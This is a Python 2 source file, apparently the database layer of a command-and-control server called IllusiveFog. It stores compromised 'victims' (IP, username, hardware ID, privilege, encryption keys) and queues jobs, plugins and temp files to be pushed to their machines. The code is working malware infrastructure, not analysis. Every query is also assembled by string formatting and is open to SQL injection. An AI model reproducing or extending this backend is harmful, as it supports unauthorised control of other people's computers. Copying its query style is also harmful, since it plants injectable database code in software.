#Sqlite3 DB related operations

from sqlalchemy import create_engine
from sqlalchemy import Table, Column, Integer, String, MetaData, ForeignKey
from sqlalchemy.orm import sessionmaker
from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from collections import namedtuple
import os,shutil

if os.name =="nt":
        dbPath=os.getcwd()+"\\support\\"
        bkpPath = dbPath+"db_bkp\\IllusiveFog.db"
else:
        dbPath=os.getcwd()+"/support/"
        bkpPath = dbPath+"db_bkp/IllusiveFog.db"


#Rest Database.
def resetDB():
    try:
        os.remove(dbPath+"IllusiveFog.db")
        shutil.copyfile(bkpPath,dbPath+"IllusiveFog.db")
    except Exception as e:
        print e
        pass

#Custom Exceptions for DB integrity
class ResourceClosedError(Exception):
        pass 

#DB initiate
class DBinit():
    def __init__(self):
        self.dbs = create_engine("sqlite:///support/IllusiveFog.db")

    def InitiationDB(self):
        return self.dbs

#Save Victims Info
class Victim():
    def __init__(self):
        #Initialize DB for every new instance
        #appdb = Flask(__name__)
        self.db = DBinit().InitiationDB()

    # Insert, Update, Delete
    def execute_query(self, query=''):
        if query == '' : return
        with self.db.connect() as connection:
            try:
                query_data= connection.execute(query)
                query_data.close()
                return query_data 
                
            except Exception as e:
                print "{0} , {1}".format(type(e).__name__, e.args)
            
    def QueryVictim(self,victimid):
        query = 'SELECT id, ip, username, hwid, os, privilege, com_key, plugins_key, pellet_key, Arch FROM Victims WHERE id="{0}";'.format(victimid)
        #print query
        try :
            with self.db.connect() as connection:
                try:
                    result = connection.execute(query)
                    for row in result:
                        return row
                except Exception as e:
                    print e
                    pass
        except Exception:
            print "[+] Unable to connect Database"
            pass

    def print_all_data(self):
        query = "SELECT * FROM 'Victims';"
        with self.db.connect() as connection:
            try:
                result = connection.execute(query)
            except Exception as e:
                print e
                pass
            else:
                print """\nID          IP              USERNAME                HWID                OS                 PRIVILEGES\n==          ==              ========                ====                ==                 =========="""
                for rows in result:
                    print"""\r{0}   {1}       {2}                    {3}                {4}               {5}""".format(rows[1],rows[0],rows[2],rows[3],rows[4],rows[5])
                print "===========================================================================================================\n"
    
    def DBinsertVictimData(self,id, ip, username, hwid, os, privilege,com_key,plugins_key,pellet_key,arch):
        try:
            query = 'INSERT INTO Victims (id, ip, username, hwid, os, privilege, com_key, plugins_key, pellet_key, Arch) VALUES ("{0}","{1}","{2}","{3}","{4}","{5}","{6}","{7}","{8}","{9}");'.format(id, ip, username, hwid, os, privilege,com_key,plugins_key,pellet_key,arch)
            self.execute_query(query)
        except Exception as e:
            print e
            pass
    
    def FetchVictimPrivLvl(self,victim_id):
        query = 'SELECT privilege  FROM Victims WHERE id="{0}";'.format(victim_id)
        try :
            with self.db.connect() as connection:
                try:
                    result = connection.execute(query)
                    for row in result:
                        return str(row[0])
                except Exception as e:
                    print e
                    pass
        except Exception:
            print "[+] Unable to connect Database"
            pass
    
    def FetchVictimArch(self,victim_id):
        query = 'SELECT Arch  FROM Victims WHERE id="{0}";'.format(victim_id)
        try :
            with self.db.connect() as connection:
                try:
                    result = connection.execute(query)
                    for row in result:
                        return str(row[0])
                except Exception as e:
                    print e
                    pass
        except Exception:
            print "[+] Unable to connect Database"
            pass
    
    def FetchVictimOS(self,victim_id):
        query = 'SELECT os FROM Victims WHERE id="{0}";'.format(victim_id)
        try :
            with self.db.connect() as connection:
                try:
                    result = connection.execute(query)
                    for row in result:
                        return str(row[0])
                except Exception as e:
                    print e
                    pass
        except Exception:
            print "[+] Unable to connect Database"
            pass

#Save Assigned Tasks
class JobsTask():
    def __init__(self):
        self.db = DBinit().InitiationDB()
    
    # Insert, Update, Delete
    def execute_query(self, query=''):
        if query == '' : return
        with self.db.connect() as connection:
            try:
                return connection.execute(query)
            except Exception as e:
                print(e)

    #fetch jobs for httpserver
    def HTTPSrvfetchjobs(self, query=''):
        if query == '' : return
        with self.db.connect() as connection:
            try:
                return connection.execute(query).fetchall()
            except Exception as e:
                print(e)

    #Fetch plugin path
    def HTTPSrvFetchPlugin(self,query=''):
        if query == '' : return
        with self.db.connect() as connection:
            try:
                return connection.execute(query).fetchall()
            except Exception as e:
                return '' #print e

    #Fetch Temp Files path to be loaded on client
    def HTTPSrvFetchTempFilePath(self,query=''):
        if query == '' : return
        with self.db.connect() as connection:
            try:
                return connection.execute(query).fetchall()
            except Exception as e:
                print e
                return ''
    
    #Fetch Individual Job
    def HTTPSrvFetchJob(self,query=''):
        if query == '' : return
        with self.db.connect() as connection:
            try:
                return connection.execute(query).fetchall()
            except Exception as e:
                print(e)

    #List All assigned jobs
    def ListAllJobs(self):
            query = "SELECT * FROM 'jobs';"
            with self.db.connect() as connection:
                try:
                    result = connection.execute(query).fetchall()
                except Exception as e:
                    print e
                else:
                    count = 0
                    for jobs in result:
                        count += 1
                        print str(count) +" "+str(jobs[0])+" - "+str(jobs[3])
    
    def AddJobs(self,victim,job_alias,plugin_path,JobId,TempFiles,pellets):
        query = "INSERT INTO jobs VALUES ('{0}','{1}','{2}','{3}','{4}','{5}');".format(victim,job_alias,plugin_path,JobId,TempFiles,pellets)
        try:
            self.execute_query(query)
        except Exception as e:
            print e
            pass

class DBCrypto():
    def __init__(self):
      self.db = DBinit().InitiationDB()
    
    # Insert, Update, Delete
    def execute_query(self, query=''):
        if query == '' : return
        with self.db.connect() as connection:
            try:
                return connection.execute(query)
            except Exception as e:
                print(e)

    def DBfetchComKeys(self,query):
        if query == '' : return
        with self.db.connect() as connection:
            try:
                return connection.execute(query).fetchall()
            except Exception as e:
                print(e)

    def DBFetchPluginsKeys(self,query):
        if query == '' : return
        with self.db.connect() as connection:
            try:
                return connection.execute(query).fetchall()
            except Exception as e:
                print(e)
    
    def DBFetchPelletKeys(self,query):
        if query == '' : return
        with self.db.connect() as connection:
            try:
                return connection.execute(query).fetchall()
            except Exception as e:
                print(e)